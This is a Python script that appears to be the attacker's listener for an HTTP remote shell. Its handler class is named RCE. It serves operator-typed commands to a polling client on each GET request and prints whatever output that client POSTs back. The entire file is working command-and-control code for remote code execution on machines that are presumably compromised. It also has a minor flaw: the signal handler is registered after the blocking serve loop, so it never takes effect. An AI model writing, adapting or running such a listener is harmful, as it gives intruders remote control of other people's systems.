import http.server, socketserver, signal

PORT = 8000

class RCE(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        command_input = input("shell > ")
        self.wfile.write(bytes(command_input + '\n', "utf-8"))
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        print(post_data.decode())
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()

def signal_handler(sig, frame):
    print("Closing server ...")
    httpd.server_close()

with socketserver.TCPServer(("", PORT), RCE) as httpd:
    print("Server started on port", PORT)
    print(" ")
    httpd.serve_forever()
    signal.signal(signal.SIGINT, signal_handler)
